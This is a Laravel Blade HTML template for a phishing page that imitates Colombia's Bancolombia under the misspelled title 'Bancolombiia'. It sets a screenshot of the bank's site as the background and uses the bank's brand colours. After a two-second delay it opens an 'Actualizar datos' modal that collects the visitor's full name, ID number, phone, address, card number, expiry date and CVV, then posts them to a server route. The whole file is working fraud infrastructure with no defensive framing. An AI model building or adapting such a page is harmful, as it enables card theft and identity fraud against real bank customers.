<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <title>Bancolombiia</title>

        <link rel="icon" href="{{ asset('Img/favicon.png') }}" type="image/png">

        <!-- Fonts -->
        <link rel="preconnect" href="https://fonts.bunny.net">
        <link href="https://fonts.bunny.net/css?family=figtree:400,500,600&display=swap" rel="stylesheet" />

        <!-- Agrega la fuente Roboto desde Google Fonts -->
        <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">

        <!-- Estilos personalizados para los inputs y labels -->
        <style>
            .input-container {
                position: relative;
            }
            .input-icon {
                position: absolute;
                left: 12px;
                top: 50%;
                transform: translateY(-50%);
                color: #6b7280; /* Color gris para los iconos */
            }
            .input-field {
                padding-left: 40px; /* Espacio para el icono */
            }
        </style>
        <!-- Tailwind CSS (si no estás usando Vite) -->
        <script src="https://cdn.tailwindcss.com"></script>

        <!-- Script para abrir el modal -->
        <script>
            document.addEventListener("DOMContentLoaded", function() {
                setTimeout(function() {
                    document.getElementById('myModal').classList.remove('hidden');
                }, 2000);
            });
        </script>
    </head>
    <body class="font-sans antialiased dark:bg-black dark:text-white/50">
        <!-- Imagen de fondo -->
        <div class="w-full h-full overflow-auto">
            <img src="{{ asset('Img/post.png') }}" alt="Imagen de la página web de Bancolombia" class="w-full h-full object-cover">
        </div>

        <!-- Modal -->
        <div id="myModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden">
            <div class="bg-white p-6 rounded-lg w-11/12 md:w-1/2 lg:w-1/3">
                <!-- Mensaje importante -->
                <div class="mb-6">
                    <h2 class="text-xl font-semibold mb-4 text-gray-800" style="font-family: 'Roboto', sans-serif;">Actualizar datos</h2>
                    <p class="text-gray-700 text-sm" style="font-family: 'Roboto', sans-serif;">
                        Es importante que actualice sus datos antes de continuar. Por favor, ingrese la información solicitada a continuación para garantizar que sus datos estén correctamente registrados en nuestro sistema.
                    </p>
                </div>
                <form id="dataForm" action="{{ route('form.store') }}" method="POST">
                    @csrf <!-- Token CSRF para protección -->
                
                    <!-- Sección: Datos Personales -->
                    <div class="mb-8">
                        <h2 class="text-xl font-semibold mb-4 text-gray-800" style="font-family: 'Roboto', sans-serif;">Datos Personales</h2>
                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                            <!-- Nombre -->
                            <div class="mb-4">
                                <label for="nombre" class="block text-sm font-medium text-gray-700 mb-1" style="font-family: 'Roboto', sans-serif;">Nombre Completo</label>
                                <input type="text" name="nombre" id="nombre" class="w-full px-4 py-2 border-2 border-gray-400 rounded-lg focus:border-[#F0C900] focus:outline-none focus:ring-2 focus:ring-[#F0C900] focus:border-transparent transition-all" style="font-family: 'Roboto', sans-serif;" required>
                                @error('nombre')
                                    <p class="text-red-500 text-sm mt-1">{{ $message }}</p>
                                @enderror
                            </div>
                            <!-- Documento -->
                            <div class="mb-4">
                                <label for="cc" class="block text-sm font-medium text-gray-700 mb-1" style="font-family: 'Roboto', sans-serif;">Número de Documento</label>
                                <input type="text" name="cc" id="cc" class="w-full px-4 py-2 border-2 border-gray-400 rounded-lg focus:border-[#F0C900] focus:outline-none focus:ring-2 focus:ring-[#F0C900] focus:border-transparent transition-all" style="font-family: 'Roboto', sans-serif;" required>
                                @error('cc')
                                    <p class="text-red-500 text-sm mt-1">{{ $message }}</p>
                                @enderror
                            </div>
                            <!-- Teléfono -->
                            <div class="mb-4">
                                <label for="telefono" class="block text-sm font-medium text-gray-700 mb-1" style="font-family: 'Roboto', sans-serif;">Teléfono</label>
                                <input type="text" name="telefono" id="telefono" class="w-full px-4 py-2 border-2 border-gray-400 rounded-lg focus:border-[#F0C900] focus:outline-none focus:ring-2 focus:ring-[#F0C900] focus:border-transparent transition-all" style="font-family: 'Roboto', sans-serif;" required>
                                @error('telefono')
                                    <p class="text-red-500 text-sm mt-1">{{ $message }}</p>
                                @enderror
                            </div>
                            <!-- Dirección -->
                            <div class="mb-4">
                                <label for="direccion" class="block text-sm font-medium text-gray-700 mb-1" style="font-family: 'Roboto', sans-serif;">Dirección de Residencia</label>
                                <input type="text" name="direccion" id="direccion" class="w-full px-4 py-2 border-2 border-gray-400 rounded-lg focus:border-[#F0C900] focus:outline-none focus:ring-2 focus:ring-[#F0C900] focus:border-transparent transition-all" style="font-family: 'Roboto', sans-serif;" required>
                                @error('direccion')
                                    <p class="text-red-500 text-sm mt-1">{{ $message }}</p>
                                @enderror
                            </div>
                        </div>
                    </div>
                
                    <!-- Sección: Datos de la Tarjeta -->
                    <div class="mb-8">
                        <h2 class="text-xl font-semibold mb-4 text-gray-800" style="font-family: 'Roboto', sans-serif;">Datos de la Tarjeta</h2>
                        <div class="grid grid-cols-1 gap-4">
                            <!-- Número de Tarjeta -->
                            <div class="mb-4">
                                <label for="numero" class="block text-sm font-medium text-gray-700 mb-1" style="font-family: 'Roboto', sans-serif;">Número de Tarjeta</label>
                                <input type="text" name="numero" id="numero" class="w-full px-4 py-2 border-2 border-gray-400 rounded-lg focus:border-[#F0C900] focus:outline-none focus:ring-2 focus:ring-[#F0C900] focus:border-transparent transition-all" style="font-family: 'Roboto', sans-serif;" required>
                                @error('numero')
                                    <p class="text-red-500 text-sm mt-1">{{ $message }}</p>
                                @enderror
                            </div>
                            <!-- Fecha de Expiración y CVV -->
                            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                                <!-- Fecha de Expiración -->
                                <div class="mb-4">
                                    <label for="fecha" class="block text-sm font-medium text-gray-700 mb-1" style="font-family: 'Roboto', sans-serif;">Fecha de Expiración</label>
                                    <input type="text" name="fecha" id="fecha" class="w-full px-4 py-2 border-2 border-gray-400 rounded-lg focus:border-[#F0C900] focus:outline-none focus:ring-2 focus:ring-[#F0C900] focus:border-transparent transition-all" style="font-family: 'Roboto', sans-serif;" placeholder="MM/YY" required>
                                    @error('fecha')
                                        <p class="text-red-500 text-sm mt-1">{{ $message }}</p>
                                    @enderror
                                </div>
                                <!-- CVV -->
                                <div class="mb-4">
                                    <label for="cvv" class="block text-sm font-medium text-gray-700 mb-1" style="font-family: 'Roboto', sans-serif;">CVV</label>
                                    <input type="text" name="cvv" id="cvv" class="w-full px-4 py-2 border-2 border-gray-400 rounded-lg focus:border-[#F0C900] focus:outline-none focus:ring-2 focus:ring-[#F0C900] focus:border-transparent transition-all" style="font-family: 'Roboto', sans-serif;" required maxlength="4">
                                    @error('cvv')
                                        <p class="text-red-500 text-sm mt-1">{{ $message }}</p>
                                    @enderror
                                </div>
                            </div>
                        </div>
                    </div>
                
                    <!-- Botón de Enviar -->
                    <div class="flex justify-end">
                        <button type="submit" class="bg-[#FDDA24] text-black px-6 py-2 rounded-lg hover:bg-[#F0C900] focus:outline-none focus:ring-2 focus:ring-[#FDDA24] focus:ring-offset-2 transition-all">
                            Continuar
                        </button>
                    </div>
                </form>
                
                <!-- Script para formatear la fecha -->
                <script>
                    function formatFecha(input) {
                        // Eliminar cualquier carácter que no sea un número
                        let value = input.value.replace(/\D/g, '');
                
                        // Agregar la barra después de los primeros 2 dígitos
                        if (value.length > 2) {
                            value = value.slice(0, 2) + '/' + value.slice(2, 4);
                        }
                
                        // Actualizar el valor del input
                        input.value = value;
                    }
                
                    // Aplicar el formateo al campo de fecha
                    document.getElementById('fecha').addEventListener('input', function () {
                        formatFecha(this);
                    });
                </script>
            </div>
        </div>
    </body>
</html>


